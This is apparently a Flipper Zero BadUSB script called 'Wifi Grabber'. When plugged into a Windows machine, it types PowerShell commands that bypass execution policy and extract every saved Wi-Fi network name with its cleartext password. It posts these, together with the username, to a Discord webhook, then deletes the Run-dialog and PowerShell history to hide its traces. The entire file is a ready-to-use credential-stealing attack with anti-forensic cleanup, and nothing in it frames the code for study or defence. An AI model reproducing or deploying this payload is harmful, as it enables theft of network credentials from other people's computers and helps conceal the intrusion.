let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let eventLoop = require("event_loop");
let gui = require("gui");
let dialog = require("gui/dialog");

let views = {
    dialog: dialog.makeWith({
        header: "Wifi Grabber",
        text: "Press OK to start",
        center: "Start",
    }),
};

badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfrName: "Flipper",
    prodName: "Zero",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

eventLoop.subscribe(views.dialog.input, function (_sub, button, eventLoop, gui) {
    if (button !== "center")
        return;

    gui.viewDispatcher.sendTo("back");

    if (badusb.isConnected()) {
        notify.blink("green", "short");
        print("USB is connected");

        print("Open Powershell");
        badusb.press("GUI", "r");
        delay(600);
        badusb.println("powershell -NoProfile -ExecutionPolicy Bypass");
        delay(600);

        // Discord webhook URL
        print("Discord webhook URL");
        badusb.println("$discordWebhook = \"<Webhookurl>\"");
        
        // Get the device name or username
        print("Get the device's name");
        badusb.println("$deviceName = whoami");
        
        // Get all saved WiFi profile
        print("Get all saved WiFi profile");
        badusb.println("$profiles = netsh wlan show profiles | Select-String \"All User Profile\" | ForEach-Object {");
        badusb.println("($_ -split \":\")[1].Trim()}");
        delay(100);

        // Build the output message
        print("Build the output message");
        badusb.println("$output = \"\"");
        badusb.println("foreach ($profile in $profiles) {");
        badusb.println("$output += \"Wi-Fi Profile: $profile`n\"");
        badusb.println("$key = netsh wlan show profile $profile key=clear | Select-String \"Key Content\" | ForEach-Object {");
        badusb.println("($_ -split \":\")[1].Trim()}");
        badusb.println("$output += \"Password: $key`n`n\"}");
        delay(100);

        // JSON payload
        print("JSON payload");
        badusb.println("$payload = @{");
        badusb.println("content = \"Here are the Wi-Fi profiles and passwords for ${deviceName}:`n`n$output\"");
        badusb.println("} | ConvertTo-Json -Depth 10");
        delay(500);
        
        // Send the message to Discord
        print("Send the message to Discord");
        badusb.println("Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType 'application/json' -Body $payload");
        delay(500);

        // Delete traces
        print("Delete traces");
        badusb.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
        badusb.println("Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue");

        // Exit PowerShell
        print("Exit PowerShell");
        badusb.println("exit");

        notify.success();
    } else {
        print("USB not connected");
        notify.error();
    }

    // Optional, but allows to unlock usb interface to switch profile
    badusb.quit();

    eventLoop.stop();
}, eventLoop, gui);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _item, eventLoop) {
    eventLoop.stop();
}, eventLoop);

gui.viewDispatcher.switchTo(views.dialog);
eventLoop.run();
